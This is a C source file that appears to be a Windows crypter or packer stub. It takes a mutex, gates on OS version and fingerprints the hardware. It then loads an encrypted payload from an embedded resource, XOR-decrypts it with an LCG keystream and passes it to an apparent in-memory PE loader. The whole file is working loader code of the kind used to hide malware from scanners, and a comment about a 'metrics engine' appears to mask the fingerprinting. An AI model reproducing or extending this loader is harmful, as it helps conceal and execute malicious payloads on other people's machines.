#include <windows.h>
#include <stdint.h>
#include "pe_load.h"
#include "payload_meta.h"

static HANDLE _g_inst = NULL;

/* Single-instance guard */
static BOOL _acquire_instance(void) {
    _g_inst = CreateMutexA(NULL, TRUE,
        "Global\\{4B7C2A9E-F38D-41AC-B527-D9E6C1A3B8F4}");
    if (!_g_inst) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(_g_inst);
        _g_inst = NULL;
        return FALSE;
    }
    return TRUE;
}

/* System probe */
static DWORD _sys_probe(void) {
    SYSTEM_INFO   si;
    MEMORYSTATUSEX ms;
    char          name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD         nlen = sizeof(name);

    GetNativeSystemInfo(&si);

    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);

    GetComputerNameA(name, &nlen);

    /* combine into a stable fingerprint used by the metrics engine */
    DWORD fp = si.dwNumberOfProcessors;
    fp ^= (DWORD)(ms.ullTotalPhys >> 20);   /* MB of RAM */
    fp ^= (DWORD)(ULONG_PTR)si.lpMinimumApplicationAddress;
    for (DWORD i = 0; i < nlen; i++) fp = fp * 31u + (unsigned char)name[i];
    return fp;
}

/* Version gate */
static BOOL _version_ok(void) {
    typedef LONG (WINAPI *pfnRtlGVE)(OSVERSIONINFOW *);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pfnRtlGVE fn  = ntdll
        ? (pfnRtlGVE)GetProcAddress(ntdll, "RtlGetVersion")
        : NULL;
    if (!fn) return TRUE;   /* can't check, continue */
    OSVERSIONINFOW osv;
    osv.dwOSVersionInfoSize = sizeof(osv);
    fn(&osv);
    return (osv.dwMajorVersion > 9);
}

static void _decrypt(uint8_t *buf, uint32_t len, uint32_t seed) {
    uint32_t  s = seed;
    uint32_t *p = (uint32_t *)buf;
    uint32_t  n = len >> 2;
    for (uint32_t i = 0; i < n; i++) {
        p[i] ^= s;
        s = s * 1664525u + 1013904223u;
    }
    uint8_t *t = buf + (n << 2);
    for (uint32_t i = 0, rem = len & 3u; i < rem; i++)
        t[i] ^= (uint8_t)(s >> (i * 8));
}

void __stdcall WinMainCRTStartup(void) {
    /* single-instance */
    if (!_acquire_instance()) {
        ExitProcess(0);
        return;
    }

    /* version gate */
    if (!_version_ok()) {
        ExitProcess(0);
        return;
    }

    /* hardware fingerprin */
    volatile DWORD fp = _sys_probe();
    (void)fp;

    HRSRC   hres = FindResourceA(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
    if (!hres) { ExitProcess(1); return; }
    HGLOBAL hgl  = LoadResource(NULL, hres);
    if (!hgl)  { ExitProcess(1); return; }
    const uint8_t *src  = (const uint8_t *)LockResource(hgl);
    DWORD          rlen = SizeofResource(NULL, hres);
    if (!src || rlen < PAYLOAD_SIZE) { ExitProcess(1); return; }

    /* allocate RW, copy, decrypt */
    uint8_t *mem = (uint8_t *)VirtualAlloc(
        NULL, PAYLOAD_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { ExitProcess(1); return; }

    for (uint32_t i = 0; i < PAYLOAD_SIZE; i++) mem[i] = src[i];
    _decrypt(mem, PAYLOAD_SIZE, PAYLOAD_SEED);

    pe_load(mem, PAYLOAD_SIZE);
    ExitProcess(0);
}
